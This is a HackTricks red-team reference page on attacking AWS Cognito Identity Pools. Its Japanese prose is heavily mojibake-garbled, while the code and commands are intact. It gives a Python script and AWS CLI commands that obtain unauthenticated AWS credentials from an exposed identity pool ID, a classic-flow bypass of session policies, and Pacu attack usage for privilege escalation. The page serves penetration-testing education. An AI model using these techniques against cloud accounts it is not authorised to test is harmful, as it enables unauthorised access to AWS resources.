# Cognito Identity Pools

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## åŸºæœ¬æƒ…å ±

Identity poolsã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**ä¸€æ™‚çš„ãªèªè¨¼æƒ…å ±**ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ã“ã¨ã§é‡è¦ãªå½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®èªè¨¼æƒ…å ±ã¯ã€Amazon S3ã‚„DynamoDBãªã©ã€æ§˜ã€…ãªAWSã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä¸å¯æ¬ ã§ã™ã€‚Identity poolsã®ç‰¹ç­†ã™ã¹ãæ©Ÿèƒ½ã¯ã€åŒ¿åã®ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã ã‘ã§ãªãã€ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã®ãŸã‚ã®ã•ã¾ã–ã¾ãªã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«ã¯ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™:

- Amazon Cognitoãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«
- Facebookã€Googleã€Login with Amazonã€Sign in with Appleãªã©ã®ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³
- OpenID Connect (OIDC) ã«æº–æ‹ ã—ãŸãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼
- SAML (Security Assertion Markup Language) ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼
- é–‹ç™ºè€…èªè¨¼æ¸ˆã¿ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Identity Pool ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã«ã¯ã€ã¾ãš**Identity ID ã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ã“ã® Identity ID ã¯ã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®**è­˜åˆ¥å­ã§ã™**ã€‚ã“ã‚Œã‚‰ã®è­˜åˆ¥å­ã¯ã€æœ€å¤§1MBã®ã‚­ãƒ¼ãƒãƒªãƒ¥ãƒ¼ãƒšã‚¢ã‚’æ ¼ç´ã§ãã‚‹æœ€å¤§20ã®ãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’ä¿æŒã™ã‚‹ã®ã«**å½¹ç«‹ã¡ã¾ã™**ï¼ˆå¸¸ã«åŒã˜ Identity ID ã‚’ä½¿ç”¨ã—ã¾ã™ï¼‰ã€‚

ã•ã‚‰ã«ã€ã‚µãƒ¼ãƒ“ã‚¹ **cognito-sync** ã¯ã€ã“ã®æƒ…å ±ï¼ˆãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆå†…ã®æƒ…å ±ã€ã‚¹ãƒˆãƒªãƒ¼ãƒ ã§ã®æƒ…å ±é€ä¿¡ã€SNS ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãªã©ï¼‰ã‚’**ç®¡ç†ã—åŒæœŸã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹**ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚

### ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãŸã‚ã®ãƒ„ãƒ¼ãƒ«

* [Pacu](https://github.com/RhinoSecurityLabs/pacu) ã¯ã€AWS ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã€"cognito\_\_enum" ã¨ "cognito\_\_attack" ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã®ã™ã¹ã¦ã® Cognito ã‚¢ã‚»ãƒƒãƒˆã®åˆ—æŒ™ã‚’è‡ªå‹•åŒ–ã—ã€å¼±ã„è¨­å®šã€ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼å±æ€§ãªã©ã‚’ãƒ•ãƒ©ã‚°ä»˜ã‘ã—ã€ã¾ãŸã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆï¼ˆMFA ã‚µãƒãƒ¼ãƒˆã‚’å«ã‚€ï¼‰ã¨ã€å¤‰æ›´å¯èƒ½ãªã‚«ã‚¹ã‚¿ãƒ å±æ€§ã€ä½¿ç”¨å¯èƒ½ãª Identity Pool è³‡æ ¼æƒ…å ±ã€id ãƒˆãƒ¼ã‚¯ãƒ³å†…ã®å¼•ãå—ã‘å¯èƒ½ãªãƒ­ãƒ¼ãƒ«ã«åŸºã¥ãæ¨©é™æ˜‡æ ¼ã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚

ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®æ©Ÿèƒ½ã®èª¬æ˜ã«ã¤ã„ã¦ã¯ã€[ãƒ–ãƒ­ã‚°æŠ•ç¨¿](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)ã®ãƒ‘ãƒ¼ãƒˆ2ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã«ã¤ã„ã¦ã¯ã€ãƒ¡ã‚¤ãƒ³ã® [Pacu](https://github.com/RhinoSecurityLabs/pacu) ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

#### ä½¿ç”¨æ³•

ç‰¹å®šã® Identity Pool ã¨ User Pool ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«å¯¾ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆã¨ã™ã¹ã¦ã® privesc ãƒ™ã‚¯ãƒˆãƒ«ã‚’è©¦ã¿ã‚‹ cognito\_\_attack ã®ä½¿ç”¨ä¾‹ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```
Sample cognito__enumã®ä½¿ç”¨ä¾‹ã¯ã€ç¾åœ¨ã®AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§è¦‹ãˆã‚‹ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ¼ãƒ«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã€ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãªã©ã‚’åé›†ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™:
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) ã¯ã€Pythonã§æ›¸ã‹ã‚ŒãŸCLIãƒ„ãƒ¼ãƒ«ã§ã€Cognitoã«å¯¾ã™ã‚‹ã•ã¾ã–ã¾ãªæ”»æ’ƒã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€æœ›ã¾ã—ããªã„ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆã‚„ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ—ãƒ¼ãƒ«ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãŒå«ã¾ã‚Œã¾ã™ã€‚

#### ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«
```bash
$ pip install cognito-scanner
```
#### ä½¿ç”¨æ–¹æ³•
```bash
$ cognito-scanner --help
```
è©³ç´°ã«ã¤ã„ã¦ã¯ã€https://github.com/padok-team/cognito-scanner ã‚’ã”è¦§ãã ã•ã„ã€‚

## IAMãƒ­ãƒ¼ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

### èªè¨¼ã•ã‚Œã¦ã„ãªã„

æ”»æ’ƒè€…ãŒCognitoã‚¢ãƒ—ãƒªã§**AWSã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«**ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚‹ã®ã¯ã€**Identity Pool ID**ã®ã¿ã§ã€ã“ã®**IDã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**å†…ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚IDã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`ï¼ˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã¯ä¸å¯èƒ½ã§ã™ï¼‰ã€‚

{% hint style="success" %}
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä½œæˆã•ã‚Œã‚‹**IAM Cognitoæœªèªè¨¼ãƒ­ãƒ¼ãƒ«**ã¯ `Cognito_<Identity Pool name>Unauth_Role` ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸIdentity Pools IDã‚’è¦‹ã¤ã‘ã€ãã‚ŒãŒæœªèªè¨¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã®æ–¹æ³•ã§AWSã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚’å–å¾—ã§ãã¾ã™ï¼š
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
ä»¥ä¸‹ã®**aws cliã‚³ãƒãƒ³ãƒ‰**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„Cognito **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãƒãƒªã‚·ãƒ¼ã‚’ä»‹ã—ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸå ´åˆã§ã‚‚ã€ã„ã‹ãªã‚‹æ¨©é™ã‚‚æŒã¤ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### å¼·åŒ–èªè¨¼ãƒ•ãƒ­ãƒ¼ã¨åŸºæœ¬èªè¨¼ãƒ•ãƒ­ãƒ¼

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å¼·åŒ–èªè¨¼ãƒ•ãƒ­ãƒ¼**ã«å¾“ã„ã¾ã—ãŸã€‚ã“ã®ãƒ•ãƒ­ãƒ¼ã¯ã€ç”Ÿæˆã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«[**åˆ¶é™çš„ãªã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒªã‚·ãƒ¼**](../../aws-basic-information/#session-policies)ã‚’è¨­å®šã—ã¾ã™ã€‚ã“ã®ãƒãƒªã‚·ãƒ¼ã¯ã€ãƒ­ãƒ¼ãƒ«ãŒä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããŸã¨ã—ã¦ã‚‚ã€[**ã“ã®ãƒªã‚¹ãƒˆã‹ã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã®ã¿ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¾ã™**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)ã€‚

ã—ã‹ã—ã€ã“ã‚Œã‚’å›é¿ã™ã‚‹æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚**Identityãƒ—ãƒ¼ãƒ«ã«ã€ŒåŸºæœ¬ï¼ˆã‚¯ãƒ©ã‚·ãƒƒã‚¯ï¼‰ãƒ•ãƒ­ãƒ¼ã€ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆ**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã®ãƒ•ãƒ­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã§ãã€**ãã®åˆ¶é™çš„ãªã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒªã‚·ãƒ¼ã¯é©ç”¨ã•ã‚Œã¾ã›ã‚“**ã€‚

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
ã“ã®**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ãŸå ´åˆã€**åŸºæœ¬ãƒ•ãƒ­ãƒ¼ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ãªã„ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆï¼‰**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAMã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€[ã©ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒã‚ã‚‹ã‹ã‚’ç¢ºèª](../../#whoami)ã—ã€[æ¨©é™æ˜‡æ ¼](../../aws-privilege-escalation/)ã‚’è©¦ã¿ã¦ãã ã•ã„ã€‚

### èªè¨¼æ¸ˆã¿

{% hint style="info" %}
**èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«ã¯ãŠãã‚‰ã**ç•°ãªã‚‹æ¨©é™**ãŒä»˜ä¸ã•ã‚Œã‚‹ãŸã‚ã€ã‚¢ãƒ—ãƒªå†…ã§**ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—ã§ãã‚‹å ´åˆ**ã¯ã€ãã‚Œã‚’è©¦ã¿ã¦æ–°ã—ã„ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚’å–å¾—ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

**èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒIdentity Poolã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ãƒ­ãƒ¼ãƒ«**ã‚‚å­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã«ã¯ã€**identity provider**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã‚ŒãŒ**Cognito User Pool**ã§ã‚ã‚‹å ´åˆã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®æŒ¯ã‚‹èˆã„ã‚’æ‚ªç”¨ã—ã¦**è‡ªåˆ†ã§æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% hint style="success" %}
**IAM Cognitoèªè¨¼æ¸ˆã¿ãƒ­ãƒ¼ãƒ«ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§** `Cognito_<Identity Pool name>Auth_Role` **ã¨å‘¼ã°ã‚Œã¾ã™**
{% endhint %}

ã¨ã«ã‹ãã€**æ¬¡ã®ä¾‹**ã¯ã€Identity Poolã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**Cognito User Pool**å†…ã§æ—¢ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã“ã¨ã‚’å‰æã¨ã—ã¦ã„ã¾ã™ï¼ˆä»–ã®ã‚¿ã‚¤ãƒ—ã®identity providerã‚‚è¨­å®šã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ï¼‰ã€‚

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Get the identity_id from the previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# In the IdToken you can find roles a user has access because of User Pool Groups
# Use the --custom-role-arn to get credentials to a specific role
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹identity providerã«å¿œã˜ã¦ã€ã¾ãŸã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä¾å­˜ã—ã¦**ç•°ãªã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’**è¨­å®šã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã§ã™ï¼ˆclaimsã‚’ä½¿ç”¨ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€åŒã˜ã¾ãŸã¯ç•°ãªã‚‹providerã‚’é€šã˜ã¦ç•°ãªã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ãã‚Œã‚‰ã®IAMãƒ­ãƒ¼ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã¿ã‚‹ä¾¡å€¤ãŒã‚ã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
